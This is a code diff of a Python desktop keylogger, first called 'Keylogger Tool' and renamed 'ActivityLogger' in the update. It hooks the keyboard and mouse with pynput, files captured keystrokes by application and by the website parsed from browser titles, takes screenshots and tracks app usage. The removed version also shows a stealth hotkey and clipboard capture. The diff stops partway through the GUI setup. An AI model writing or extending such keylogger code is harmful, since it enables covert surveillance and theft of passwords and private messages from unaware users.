@@ -2,683 +2,1287 @@ import tkinter as tk
 from tkinter import filedialog, ttk, messagebox, scrolledtext
 from pynput import keyboard, mouse
 import os
+import sys
 import time
 import threading
 import datetime
-from PIL import ImageGrab
-from cryptography.fernet import Fernet
-import pygame
-import sys
 import subprocess
 import re
-import pyperclip
+import json
 import hashlib
+from collections import defaultdict, deque
+from typing import Dict, List, Tuple, Optional
+from pathlib import Path
+import queue
 
-THEMES = [
-    {
-        "name": "Light",
-        "bg": "#f5f6fa", "fg": "#222831", "accent": "#2b61e0", "panel": "#e4eaff",
-        "button_bg": "#e6e8ee", "button_fg": "#2b2d42", "entry_bg": "#fff", "entry_fg": "#242831",
-        "section_bg": "#fafeff", "border": "#dbeafe", "icon": "🔓"
-    },
-    {
-        "name": "Dark",
-        "bg": "#1d1f21", "fg": "#c5c8c6", "accent": "#50fa7b", "panel": "#282a36",
-        "button_bg": "#282a36", "button_fg": "#f8f8f2", "entry_bg": "#282a36", "entry_fg": "#f8f8f2",
-        "section_bg": "#232831", "border": "#44475a", "icon": "🌑"
-    },
-    {
-        "name": "Matrix",
-        "bg": "#0d0208", "fg": "#00ff41", "accent": "#00ff41", "panel": "#1a2a1a",
-        "button_bg": "#18391b", "button_fg": "#00ff41", "entry_bg": "#18391b", "entry_fg": "#00ff41",
-        "section_bg": "#112811", "border": "#00ff41", "icon": "💾"
-    },
-    {
-        "name": "Terminal",
-        "bg": "#232323", "fg": "#39ff14", "accent": "#39ff14", "panel": "#101010",
-        "button_bg": "#222", "button_fg": "#39ff14", "entry_bg": "#222", "entry_fg": "#39ff14",
-        "section_bg": "#181818", "border": "#39ff14", "icon": "🖥"
-    },
-    {
-        "name": "Night Owl",
-        "bg": "#011627", "fg": "#82aaff", "accent": "#c792ea", "panel": "#011221",
-        "button_bg": "#1d3b53", "button_fg": "#82aaff", "entry_bg": "#12263a", "entry_fg": "#82aaff",
-        "section_bg": "#011221", "border": "#c792ea", "icon": "🦉"
-    },
-    {
-        "name": "Hacker",
-        "bg": "#0f111a", "fg": "#39ff14", "accent": "#fcee09", "panel": "#212733",
-        "button_bg": "#263238", "button_fg": "#39ff14", "entry_bg": "#191d25", "entry_fg": "#fcee09",
-        "section_bg": "#212733", "border": "#39ff14", "icon": "👾"
-    },
-    {
-        "name": "Nord",
-        "bg": "#2e3440", "fg": "#8fbcbb", "accent": "#88c0d0", "panel": "#3b4252",
-        "button_bg": "#4c566a", "button_fg": "#8fbcbb", "entry_bg": "#434c5e", "entry_fg": "#d8dee9",
-        "section_bg": "#3b4252", "border": "#88c0d0", "icon": "❄️"
-    }
-]
+try:
+    from PIL import Image, ImageGrab, ImageTk
+except ImportError: 
+    ImageGrab = None
+    ImageTk = None
 
-LOG_FONTS = ["Hack Nerd Font", "Fira Mono", "JetBrains Mono", "Matrix", "Courier New", "monospace"]
-HEADING_FONTS = ["Hack Nerd Font", "Orbitron", "Montserrat", "Segoe UI", "Arial", "sans-serif"]
 
-def get_best_font(candidates, fallback):
+try:
+    if sys.platform == "win32":  
+        import win32gui
+        import win32process
+        import psutil
+except ImportError:
+    pass
+
+
+THEME = {
+    "name": "White",
+    "bg": "#ffffff",
+    "fg": "#212529",
+    "accent": "#0d6efd",
+    "panel": "#ffffff",
+    "button_bg": "#e9ecef",
+    "button_fg": "#212529",
+    "entry_bg": "#ffffff",
+    "entry_fg": "#212529",
+    "status_active": "#198754",
+    "status_paused": "#ffc107",
+    "status_idle": "#6c757d",
+    "system_color": "#6c757d",
+    "keyboard_color": "#0d6efd",
+    "clipboard_color": "#6610f2",
+    "web_color": "#fd7e14"
+}
+
+
+STOKES_ROOT = "Stokes"
+KEY_STOKER_DIR = "Key-Stoker"
+WEB_LOGS_DIR = "Web-Keylogs"
+SYS_APPS_DIR = "System-Applications"
+SCREENSHOTS_DIR = "Screenshots"
+
+LOG_FONTS = ["Consolas", "Monaco", "Courier New", "monospace"]
+UI_FONTS = ["Segoe UI", "San Francisco", "Helvetica Neue", "Arial", "sans-serif"]
+
+
+def get_best_font(candidates: List[str], fallback:  str, size: int = 10) -> Tuple[str, int]:
     try:
         from tkinter import font as tkfont
-        fams = tkfont.families()
-        for f in candidates:
-            if f in fams:
-                return f
+        available_families = set(tkfont.families())
+        for candidate in candidates:
+            if candidate in available_families:
+                return (candidate, size)
     except Exception:
         pass
-    return fallback
+    return (fallback, size)
 
-def get_active_window_title():
+
+def resource_path(relative_path: str) -> str:
     try:
-        if sys.platform == "win32":
-            import win32gui
-            hwnd = win32gui.GetForegroundWindow()
-            win_text = win32gui.GetWindowText(hwnd)
-            return win_text if win_text else "Unknown"
-        elif sys.platform == "darwin":
-            from AppKit import NSWorkspace
-            active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
-            return active_app.localizedName()
-        else:
-            try:
-                root = subprocess.check_output(['xprop', '-root', '_NET_ACTIVE_WINDOW'])
-                window_id = root.decode().strip().split()[-1]
-                window_name = subprocess.check_output(['xprop', '-id', window_id, 'WM_NAME'])
-                return window_name.decode().split('"', 1)[1].rsplit('"', 1)[0]
-            except Exception:
-                return "Unknown"
-    except Exception:
+        base_path = sys._MEIPASS
+    except AttributeError:
+        base_path = os.path.abspath(".")
+    return os.path. join(base_path, relative_path)
+
+
+def sanitize_filename(name: str) -> str:
+    if not name:
         return "Unknown"
+    cleaned = ''.join(c for c in name if c.isalnum() or c in (' ', '_', '-')).strip()
+    cleaned = cleaned.replace(" ", "_")
+    if not cleaned:
+        return "Unknown"
+    return cleaned[: 100]
 
-def ai_interpret_sentence(sentence):
-    s = sentence.strip()
-    if not s: return ""
-    if re.match(r"^(import |def |class |for |while |if |from )", s):
-        return f'You wrote code: "{s}"'
-    if re.search(r"\.py|\.txt|\.docx|\.csv|\.json", s) and ("save" in s.lower() or "ctrl+s" in s.lower()):
-        return f'You saved or edited a file: "{s}"'
-    if "?" in s:
-        return f'You asked/searched: "{s}"'
-    if "http" in s or "www." in s:
-        return f'You visited a website: "{s}"'
-    if re.match(r"^(cd |ls |dir |pip |python |git )", s):
-        return f'You executed a command: "{s}"'
-    letters = sum(1 for c in s if c.isalpha())
-    if letters > len(s) / 2:
-        return f'You wrote: "{s}"'
-    return f'Activity: "{s}"'
 
-def ai_summarize_by_app(app_log_dict):
-    lines = []
-    for app, items in app_log_dict.items():
-        if not items: continue
-        lines.append(f"\n[{app}]")
-        for t, s in items:
-            summary = ai_interpret_sentence(s)
-            if summary:
-                lines.append(f"- {summary} ({t})")
-    return "\n".join(lines)
+def normalize_process_name(process_name: str) -> str:
+    cleaned = process_name.strip()
+    if cleaned.lower().endswith('.exe'):
+        cleaned = cleaned[:-4]
+    return cleaned
 
-class SentenceLogger:
-    def __init__(self, base_folder):
-        self.sentence = []
-        self.base_folder = base_folder
-        self.day_folder = None
-        self.ensure_day_folder()
-        self.app_sentences = {}
-    def ensure_day_folder(self):
-        self.day_folder = os.path.join(self.base_folder, datetime.datetime.now().strftime("%Y-%m-%d"))
-        os.makedirs(self.day_folder, exist_ok=True)
-    def get_app_logfile(self, appname):
-        safe = ''.join(c for c in appname if c.isalnum() or c in (' ', '_', '-')).strip().replace(" ", "_")
-        return os.path.join(self.day_folder, f"{safe or 'UnknownApp'}.txt")
-    def store_keystroke(self, key, app, timestamp=None):
-        if timestamp is None:
-            timestamp = datetime.datetime.now()
-        if key in ("[SHIFT]", "[CTRL_L]", "[CTRL_R]", "[ALT]", "[ALT_R]", "[CMD]", "[CMD_R]", "[TAB]"):
+
+class ProcessDetector:
+    @staticmethod
+    def get_active_process_info() -> Tuple[str, str]: 
+        try:
+            if sys.platform == "win32": 
+                try:
+                    import win32gui
+                    import win32process
+                    import psutil
+                    hwnd = win32gui.GetForegroundWindow()
+                    window_text = win32gui.GetWindowText(hwnd)
+                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                    try:
+                        process = psutil.Process(pid)
+                        raw_name = normalize_process_name(process.name())
+                        
+                        lower_name = raw_name.lower()
+                        process_name = raw_name 
+                        
+                       
+                        if 'chrome' in lower_name: process_name = "Google Chrome"
+                        elif 'firefox' in lower_name: process_name = "Firefox"
+                        elif 'msedge' in lower_name: process_name = "Microsoft Edge"
+                        elif 'brave' in lower_name: process_name = "Brave"
+                        elif 'opera' in lower_name or 'launcher' in lower_name:
+                            if "opera" in lower_name or "opera" in str(window_text).lower():
+                                process_name = "Opera"
+                        elif 'safari' in lower_name: process_name = "Safari"
+
+                        
+                        elif lower_name == "applicationframehost":
+                            if window_text and window_text != "Unknown":
+                                process_name = window_text.replace(" ", "")
+                            else:
+                                process_name = "WindowsSystemApp"
+                        elif lower_name == "systemsettings": process_name = "WindowsSettings"
+                        elif lower_name == "explorer":
+                            if window_text and window_text != "Program Manager":
+                                process_name = "FileExplorer"
+                            else:
+                                process_name = "WindowsShell"
+                        elif lower_name == "mspaint": process_name = "Paint"
+                        elif lower_name == "excel": process_name = "MicrosoftExcel"
+                        elif lower_name == "winword": process_name = "MicrosoftWord"
+                        elif lower_name == "powerpnt": process_name = "PowerPoint"
+                        elif lower_name == "onenote": process_name = "OneNote"
+                        elif lower_name == "notepad": process_name = "Notepad"
+                        elif lower_name == "calc": process_name = "Calculator"
+
+                    except: 
+                        process_name = "Unknown"
+                    return (process_name, window_text if window_text else "Unknown")
+                except Exception:
+                    return ("Unknown", "Unknown")
+            elif sys. platform == "darwin":
+                try:
+                    from AppKit import NSWorkspace
+                    active_app = NSWorkspace.sharedWorkspace().frontmostApplication()
+                    app_name = active_app.localizedName() if active_app else "Unknown"
+                    return (app_name, app_name)
+                except Exception: 
+                    return ("Unknown", "Unknown")
+            else:
+                try:
+                    result = subprocess.run(['xprop', '-root', '_NET_ACTIVE_WINDOW'],
+                                          capture_output=True, text=True, timeout=1)
+                    window_id = result.stdout.strip().split()[-1]
+                    result = subprocess.run(['xprop', '-id', window_id, 'WM_CLASS'],
+                                          capture_output=True, text=True, timeout=1)
+                    wm_class = result.stdout. split('"')[1] if '"' in result.stdout else "Unknown"
+                    result = subprocess.run(['xprop', '-id', window_id, 'WM_NAME'],
+                                          capture_output=True, text=True, timeout=1)
+                    window_name = result.stdout.split('"', 1)[1].rsplit('"', 1)[0]
+                    return (wm_class, window_name)
+                except Exception:
+                    return ("Unknown", "Unknown")
+        except Exception:
+            return ("Unknown", "Unknown")
+
+
+class SystemAppDetector:
+    WINDOWS_SYSTEM_APPS = [
+        'SystemSettings', 'WindowsSettings', 'ApplicationFrameHost', 'SearchApp', 'StartMenuExperienceHost',
+        'ShellExperienceHost', 'explorer', 'FileExplorer', 'WindowsShell', 'taskmgr', 'mmc', 'control', 
+        'Registry', 'regedit', 'services', 'eventvwr', 'perfmon', 'msconfig', 'WindowsUpdateBox',
+        'cmd', 'powershell', 'WindowsTerminal', 'conhost', 'RuntimeBroker',
+        'SearchUI', 'SearchHost', 'SettingsHost', 'SystemSettingsBroker',
+        'WindowsSystemApp', 'Paint', 'MicrosoftExcel', 'MicrosoftWord', 'PowerPoint', 'OneNote', 
+        'Notepad', 'Calculator'
+    ]
+
+    @staticmethod
+    def is_system_app(process_name: str) -> bool:
+        if process_name in SystemAppDetector.WINDOWS_SYSTEM_APPS:
+            return True
+        process_lower = process_name.lower()
+        for sys_app in SystemAppDetector.WINDOWS_SYSTEM_APPS:
+            if sys_app.lower() == process_lower:
+                return True
+        return False
+
+
+class BrowserDetector:
+    BROWSER_NAMES = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'Brave', 'Internet Explorer']
+
+    @staticmethod
+    def is_browser(process_name: str) -> bool:
+        return any(browser in process_name for browser in BrowserDetector.BROWSER_NAMES)
+
+    @staticmethod
+    def extract_site_name(window_title: str) -> Optional[str]:
+        if not window_title or not window_title.strip():
+            return None
+        
+        title_clean = window_title.strip()
+        
+        if title_clean.lower() in ['new tab', 'newtab', 'about:blank', '']:
+            return "NewTab"
+        
+        domain = BrowserDetector.extract_domain(window_title)
+        if domain:
+            if 'www.' in domain:
+                domain = domain.split('www.')[1]
+            return sanitize_filename(domain.split('.')[0])
+
+        separators = [' - ', ' — ', ' | ', ' – ', ' : ']
+        for sep in separators: 
+            if sep in title_clean: 
+                parts = title_clean.split(sep)
+                for part in parts:
+                    part_clean = part.strip()
+                    if any(b in part_clean for b in BrowserDetector.BROWSER_NAMES):
+                        continue
+                    if len(part_clean) > 0:
+                        return sanitize_filename(part_clean[:50])
+        
+        return sanitize_filename(title_clean[:50])
+
+    @staticmethod
+    def extract_domain(window_title: str) -> Optional[str]:
+        patterns = [
+            r'https?://([^\s/]+)',
+            r'([a-zA-Z0-9-]+\.[a-zA-Z]{2,})'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, window_title)
+            if match: 
+                return match.group(1)
+        return None
+
+
+class ScreenshotManager:
+    def __init__(self, base_folder: str):
+        self.base_folder = Path(base_folder)
+        self.lock = threading.Lock()
+        self.screenshot_count = 0 
+
+    def can_take_screenshot(self) -> bool:
+        return True
+
+    def take_screenshot(self, process_name: str, trigger:  str):
+        if not self.can_take_screenshot():
             return
-        if key in ["[ENTER]", "[SPACE]", ".", "!", "?"]:
-            if self.sentence and not (self.sentence[-1] == " " and key == "[SPACE]"):
-                self.sentence.append(" " if key == "[SPACE]" else key)
-                self.save_sentence(app, timestamp)
-        elif key == "[BACKSPACE]":
-            if self.sentence: self.sentence.pop()
-        else:
-            self.sentence.append(key)
-    def save_sentence(self, app, timestamp):
-        if not self.sentence: return
-        self.ensure_day_folder()
-        filename = self.get_app_logfile(app)
-        sentence_str = ''.join(self.sentence).replace("[SPACE]", " ").replace("[ENTER]", "\n").strip()
-        with open(filename, "a", encoding="utf-8") as f:
-            f.write(f"[{timestamp.strftime('%H:%M:%S')}] {sentence_str}\n")
-        if app not in self.app_sentences:
-            self.app_sentences[app] = []
-        self.app_sentences[app].append((timestamp.strftime('%H:%M'), sentence_str))
-        self.sentence = []
-    def log_scroll(self, direction, app, timestamp=None):
-        if timestamp is None: timestamp = datetime.datetime.now()
-        filename = self.get_app_logfile(app)
-        with open(filename, "a", encoding="utf-8") as f:
-            f.write(f"[{timestamp.strftime('%H:%M:%S')}] [SCROLL_{direction}]\n")
-        if app not in self.app_sentences:
-            self.app_sentences[app] = []
-        self.app_sentences[app].append((timestamp.strftime('%H:%M'), f"[SCROLL_{direction}]"))
-    def write_summaries(self):
-        date = datetime.datetime.now().strftime("%Y-%m-%d")
-        sumfile = os.path.join(self.day_folder, f"summary_{date}.txt")
-        summary = "Summary for the day:\n"
-        summary += ai_summarize_by_app(self.app_sentences)
-        with open(sumfile, "w", encoding="utf-8") as f:
-            f.write(summary)
+        if ImageGrab is None:
+            return
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            filename = self.base_folder / f"{trigger}_{timestamp}.png"
+            screenshot = ImageGrab.grab()
+            screenshot.save(filename)
+            with self.lock:
+                self.screenshot_count += 1
+        except Exception:
+            pass
 
-class AdvancedKeylogger:
-    def __init__(self, root):
-        self.root = root
-        self.theme_idx = 4
-        self.theme = THEMES[self.theme_idx]
+
+class AppLogger:
+    def __init__(self, web_logs_root: str, sys_apps_root: str):
+        self.web_logs_root = Path(web_logs_root)
+        self.sys_apps_root = Path(sys_apps_root)
+        self.buffer = defaultdict(list)
+        self.buffer_lock = threading.Lock()
+        self.flush_interval = 5.0
+        self.last_flush = time.time()
+
+        self.web_logs_root.mkdir(parents=True, exist_ok=True)
+        self.sys_apps_root.mkdir(parents=True, exist_ok=True)
+
+    def log_keyboard(self, process_name: str, keys: str):
+        pass 
+
+    def log_browser_visit(self, process_name: str, site_name: str, keys: str):
+        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+        entry = f"[{timestamp}] {keys}\n"
+        with self. buffer_lock:
+            self.buffer[f"Web:{process_name}:{site_name}"].append(entry)
+
+    def log_system_app(self, app_name: str, keys: str):
+        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+        entry = f"[{timestamp}] {keys}\n"
+        with self.buffer_lock:
+            self.buffer[f"System:{app_name}"].append(entry)
+
+    def should_flush(self) -> bool:
+        return (time.time() - self.last_flush) >= self.flush_interval
+
+    def flush(self):
+        with self.buffer_lock:
+            for key, entries in list(self.buffer.items()):
+                if not entries:
+                    continue
+                
+                parts = key.split(":")
+                category = parts[0]
+                
+                if category == "System":
+                    app_name = parts[1]
+                    self._flush_system_app(app_name, entries)
+                elif category == "Web":
+                    browser_name = parts[1]
+                    site_name = parts[2]
+                    self._flush_browser_visit(browser_name, site_name, entries)
+            
+            self.buffer.clear()
+            self.last_flush = time.time()
+
+    def _flush_system_app(self, app_name: str, entries: List[str]):
+        try:
+            safe_name = sanitize_filename(app_name)
+            log_file = self.sys_apps_root / f"{safe_name}.txt"
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.writelines(entries)
+        except Exception:
+            pass
+
+    def _flush_browser_visit(self, browser_name: str, site_name: str, entries: List[str]):
+        try:
+            safe_browser = sanitize_filename(browser_name)
+            safe_site = sanitize_filename(site_name)
+            
+            browser_folder = self.web_logs_root / safe_browser
+            browser_folder.mkdir(parents=True, exist_ok=True)
+            
+            log_file = browser_folder / f"{safe_site}.txt"
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.writelines(entries)
+        except Exception:
+            pass
+
+
+class UsageTracker:
+    def __init__(self):
+        self.app_times = defaultdict(float)
+        self.current_app = None
+        self. current_start = None
+        self.lock = threading.Lock()
+
+    def switch_app(self, process_name: str):
+        with self.lock:
+            now = time.time()
+            if self.current_app and self.current_start:
+                duration = now - self.current_start
+                self.app_times[self.current_app] += duration
+            self.current_app = process_name
+            self.current_start = now
+
+    def save_usage(self):
+        with self.lock:
+            if self.current_app and self.current_start:
+                duration = time.time() - self.current_start
+                self.app_times[self.current_app] += duration
+                self.current_start = time.time() 
+
+
+class KeystrokeCompressor:
+    def __init__(self):
+        self.last_key = None
+        self.repeat_count = 0
+
+    def compress(self, key: str) -> Optional[Tuple[str, int]]: 
+        if key == self.last_key:
+            self.repeat_count += 1
+            return None
+        else:
+            result = None
+            if self.last_key and self.repeat_count > 1:
+                result = (self.last_key, self.repeat_count)
+            self.last_key = key
+            self. repeat_count = 1
+            return result
+
+
+class SessionStats:
+    def __init__(self):
+        self.start_time = time.time()
+        self.keystroke_count = 0
+        self.lock = threading.Lock()
+        self.last_minute_keystrokes = deque(maxlen=60)
+
+    def add_keystroke(self):
+        with self.lock:
+            self.keystroke_count += 1
+            self.last_minute_keystrokes.append(time.time())
+
+    def get_keys_per_minute(self) -> float:
+        with self.lock:
+            now = time.time()
+            recent = [t for t in self.last_minute_keystrokes if now - t <= 60]
+            return len(recent)
+
+
+class IdleDetector:
+    def __init__(self, idle_threshold: float = 60.0):
+        self.idle_threshold = idle_threshold
+        self.last_activity = time. time()
+        self.was_idle = False
+        self.idle_count = 0 
+        self.lock = threading.Lock()
+
+    def activity(self) -> bool:
+        with self. lock:
+            self.last_activity = time.time()
+            was_idle = self.was_idle
+            self.was_idle = False
+            return was_idle
+
+    def check_idle(self) -> bool:
+        with self.lock:
+            idle_time = time.time() - self.last_activity
+            is_idle = idle_time >= self.idle_threshold
+            if is_idle and not self.was_idle:
+                self.was_idle = True
+                self.idle_count += 1 
+                return True
+            return False
+
+
+class ActivityLogger:
+    def __init__(self, root_window):
+        self.root = root_window
+        self.theme = THEME
+
         self.is_logging = False
         self.is_paused = False
-        self.is_stealth = False
-        self.log_thread = None
-        self.keys = []
-        self.log_folder = "keylogs"
-        self.screenshot_folder = "screenshots"
-        self.encryption_key = None
-        self.cipher = None
-        self.hotkeys = {"stealth": "f12", "pause": "f11"}
-        self.log_interval = 30
-        self.sentence_logger = SentenceLogger(self.log_folder)
-        pygame.mixer.init()
-        self.setup_folders()
-        self.setup_encryption()
+        self.is_hidden = False
+
+        if getattr(sys, 'frozen', False):
+            base_path = os.path.dirname(sys.executable)
+        else:
+            base_path = os.path.dirname(os.path.abspath(__file__))
+        self.root_log_dir = Path(base_path) / STOKES_ROOT
+        
+        self.screenshot_manager = None
+        self.app_logger = None
+        self.usage_tracker = None
+        
+        self.session_stats = SessionStats()
+        self.idle_detector = IdleDetector(idle_threshold=60.0)
+        self.compressor = KeystrokeCompressor()
+
+        self.context_lock = threading.Lock()
+        self.current_process = None
+        self.current_window = None
+        self.current_site = None
+        self.keystroke_buffer = []
+        
+        self.unique_websites = set()
+        self.unknown_app_count = 0
+        self.system_apps_detected = set()
+
+        self.stop_event = threading.Event()
+        self.shutdown_event = threading.Event()
+
+        self.keyboard_listener = None
+        self.mouse_listener = None
+        self.hotkey_listener = None
+
+        self.log_queue = queue.Queue(maxsize=2000)
+        self.ui_update_queue = queue.Queue(maxsize=100)
+
+        self.icon_images = {}
+
+        self.load_icons()
         self.setup_gui()
         self.apply_theme()
-        self.hotkey_listener = None
-        self.mouse_listener = None
-        self.last_clipboard = None
-        self.last_clipboard_imghash = None
+
         self.start_hotkey_listener()
+        self.start_background_tasks()
 
-    def apply_theme(self):
-        th = self.theme
-        log_font = get_best_font(LOG_FONTS, "Courier New")
-        heading_font = get_best_font(HEADING_FONTS, "Arial")
-        self.root.configure(bg=th["bg"])
-        style = ttk.Style()
-        style.theme_use('clam')
-        style.configure("TFrame", background=th["bg"])
-        style.configure("Section.TFrame", background=th["panel"])
-        style.configure("TLabel", background=th["bg"], foreground=th["fg"], font=(heading_font, 10))
-        style.configure("Accent.TLabel", background=th["bg"], foreground=th["accent"], font=(heading_font, 13, "bold"))
-        style.configure("TButton", background=th["button_bg"], foreground=th["button_fg"], font=(heading_font, 10, "bold"))
-        style.map("TButton", background=[("active", th["accent"])])
-        style.configure("TCheckbutton", background=th["panel"], foreground=th["fg"], font=(heading_font, 10))
-        style.configure("TEntry", fieldbackground=th["entry_bg"], foreground=th["entry_fg"], font=(heading_font, 10))
-        style.configure("TLabelframe", background=th["panel"], foreground=th["fg"])
-        style.configure("TLabelframe.Label", background=th["panel"], foreground=th["accent"], font=(heading_font, 12, "bold"))
-        self.preview_text.configure(bg=th["entry_bg"], fg=th["entry_fg"], insertbackground=th["accent"], font=(log_font, 12), relief=tk.GROOVE, borderwidth=2)
-        self.status_label.configure(background=th["bg"], foreground=th["accent"])
-        self.title_label.configure(background=th["bg"], foreground=th["accent"], font=(heading_font, 20, "bold"))
-        for btn in self.all_buttons:
-            btn.configure(bg=th["button_bg"], fg=th["button_fg"], activebackground=th["accent"], activeforeground=th["button_fg"], relief=tk.RAISED, bd=1, font=(heading_font, 11, "bold"))
-        for entry in self.all_entries:
-            entry.configure(bg=th["entry_bg"], fg=th["entry_fg"], insertbackground=th["accent"], relief=tk.GROOVE, borderwidth=2)
-        for frame in self.section_frames:
-            if isinstance(frame, (ttk.Frame, ttk.LabelFrame)):
-                frame.configure(style="Section.TFrame")
-            else:
-                frame.configure(bg=th["panel"])
-        self.settings_frame.configure(bg=th["panel"])
-        for widget in self.settings_frame.winfo_children():
-            if isinstance(widget, (tk.Label, tk.Checkbutton, tk.Entry, tk.Button)):
-                widget.configure(bg=th["panel"], fg=th["fg"])
-        self.root.update_idletasks()
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+        self.process_ui_updates()
 
-    def toggle_theme(self):
-        self.theme_idx = (self.theme_idx + 1) % len(THEMES)
-        self.theme = THEMES[self.theme_idx]
-        self.theme_var.set(self.theme["name"])
-        self.apply_theme()
-        self.status_label.configure(text=f"Theme: {self.theme['name']}")
-
-    def theme_menu_callback(self, value):
-        idx = next((i for i, t in enumerate(THEMES) if t["name"] == value), 0)
-        self.theme_idx = idx
-        self.theme = THEMES[self.theme_idx]
-        self.apply_theme()
-
-    def setup_gui(self):
-        log_font = get_best_font(LOG_FONTS, "Courier New")
-        heading_font = get_best_font(HEADING_FONTS, "Arial")
-        thicon = self.theme["icon"]
-        self.title_label = tk.Label(self.root, text=f"{thicon} Keylogger Tool", font=(heading_font, 20, "bold"))
-        self.title_label.pack(pady=10)
-        self.main_frame = ttk.Frame(self.root)
-        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10)
-        self.section_frames = []
-        self.all_buttons = []
-        self.all_entries = []
-        self.section_frames.append(self.main_frame)
-        topbar = ttk.Frame(self.main_frame)
-        topbar.pack(pady=0, fill=tk.X)
-        self.section_frames.append(topbar)
-        self.fullscreen_button = tk.Button(topbar, text="⛶", command=self.toggle_fullscreen, width=3)
-        self.fullscreen_button.pack(side=tk.LEFT, padx=2)
-        tk.Label(topbar, text="Full Screen", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
-        self.minimize_button = tk.Button(topbar, text="🗕", command=self.minimize, width=3)
-        self.minimize_button.pack(side=tk.LEFT, padx=2)
-        tk.Label(topbar, text="Minimize", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
-        self.halfscreen_button = tk.Button(topbar, text="▭", command=self.toggle_halfscreen, width=3)
-        self.halfscreen_button.pack(side=tk.LEFT, padx=2)
-        tk.Label(topbar, text="Half Screen", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
-        self.open_folder_button = tk.Button(topbar, text="📂", command=self.open_log_folder, width=3)
-        self.open_folder_button.pack(side=tk.LEFT, padx=2)
-        tk.Label(topbar, text="Open Log Folder", fg="#82aaff", bg="#011627").pack(side=tk.LEFT, padx=(0,15))
-        self.theme_var = tk.StringVar(value=THEMES[self.theme_idx]["name"])
-        theme_names = [t["name"] for t in THEMES]
-        self.theme_menu = ttk.OptionMenu(topbar, self.theme_var, THEMES[self.theme_idx]["name"], *theme_names, command=self.theme_menu_callback)
-        self.theme_menu.pack(side=tk.LEFT, padx=6)
-        tk.Label(topbar, text="Theme", fg="#82aaff", bg="#011627").pack(side=tk.LEFT)
-        self.all_buttons += [self.fullscreen_button, self.minimize_button, self.halfscreen_button, self.open_folder_button]
-        control_frame = ttk.Frame(self.main_frame)
-        control_frame.pack(pady=10, fill=tk.X)
-        self.section_frames.append(control_frame)
-        self.start_button = tk.Button(control_frame, text="▶", command=lambda: self.dispatch("start"), width=3)
-        self.start_button.pack(side=tk.LEFT, padx=3)
-        tk.Label(control_frame, text="Start", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
-        self.stop_button = tk.Button(control_frame, text="■", command=lambda: self.dispatch("stop"), state="disabled", width=3)
-        self.stop_button.pack(side=tk.LEFT, padx=3)
-        tk.Label(control_frame, text="Stop", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
-        self.pause_button = tk.Button(control_frame, text="⏸", command=lambda: self.dispatch("pause"), state="disabled", width=3)
-        self.pause_button.pack(side=tk.LEFT, padx=3)
-        tk.Label(control_frame, text="Pause", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
-        self.stealth_button = tk.Button(control_frame, text="🕵️", command=lambda: self.dispatch("stealth"), width=3)
-        self.stealth_button.pack(side=tk.LEFT, padx=3)
-        tk.Label(control_frame, text="Stealth", fg="#82aaff", bg="#011221").pack(side=tk.LEFT, padx=(0,15))
-        self.screenshot_btn = tk.Button(control_frame, text="📸", command=lambda: self.dispatch("screenshot"), width=3)
-        self.screenshot_btn.pack(side=tk.LEFT, padx=3)
-        tk.Label(control_frame, text="Screenshot", fg="#82aaff", bg="#011221").pack(side=tk.LEFT)
-        self.all_buttons += [self.start_button, self.stop_button, self.pause_button, self.stealth_button, self.screenshot_btn]
-        preview_frame = ttk.Frame(self.main_frame)
-        preview_frame.pack(pady=3, padx=2, fill=tk.BOTH, expand=True)
-        self.section_frames.append(preview_frame)
-        preview_label = ttk.Label(preview_frame, text="Log Preview:", style="Accent.TLabel")
-        preview_label.pack(anchor="w")
-        preview_container = tk.Frame(preview_frame)
-        preview_container.pack(fill=tk.BOTH, expand=True)
-        self.preview_text = scrolledtext.ScrolledText(preview_container, height=16, width=120, state="disabled", font=(log_font, 12), wrap=tk.WORD)
-        self.preview_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-        self.preview_scroll = tk.Scrollbar(preview_container, command=self.preview_text.yview)
-        self.preview_scroll.pack(side=tk.RIGHT, fill=tk.Y)
-        self.preview_text.config(yscrollcommand=self.preview_scroll.set)
-        self.preview_text.insert(tk.END, "No logs yet. Start logging to see activity here.")
-        self.preview_text.bind("<MouseWheel>", lambda e: self.preview_text.yview_scroll(-1*(e.delta//120), "units"))
-        self.preview_text.bind("<Button-4>", lambda e: self.preview_text.yview_scroll(-1, "units"))
-        self.preview_text.bind("<Button-5>", lambda e: self.preview_text.yview_scroll(+1, "units"))
-        search_frame = ttk.Frame(self.main_frame)
-        search_frame.pack(pady=5, padx=2, fill=tk.X)
-        self.section_frames.append(search_frame)
-        search_label = ttk.Label(search_frame, text="Search Logs:")
-        search_label.pack(side=tk.LEFT, padx=2)
-        self.search_entry = tk.Entry(search_frame, width=53)
-        self.all_entries.append(self.search_entry)
-        self.search_entry.pack(side=tk.LEFT, padx=4)
-        self.search_button = tk.Button(search_frame, text="🔍", command=lambda: self.dispatch("search"))
-        self.search_button.pack(side=tk.LEFT, padx=4)
-        self.all_buttons.append(self.search_button)
-        self.settings_frame = tk.Frame(self.main_frame, bd=2, relief=tk.RIDGE, bg=self.theme['panel'])
-        self.settings_frame.pack(pady=10, padx=10, fill=tk.X, ipadx=8, ipady=8)
-        self.section_frames.append(self.settings_frame)
-        general_label = tk.Label(self.settings_frame, text="General Settings", font=(heading_font, 13, "bold"), bg=self.theme['panel'], fg=self.theme['accent'])
-        general_label.grid(row=0, column=0, sticky="w", padx=2, pady=3, columnspan=3)
-        folder_label = tk.Label(self.settings_frame, text="Log Folder:", bg=self.theme['panel'], fg=self.theme['fg'])
-        folder_label.grid(row=1, column=0, sticky="w", padx=2)
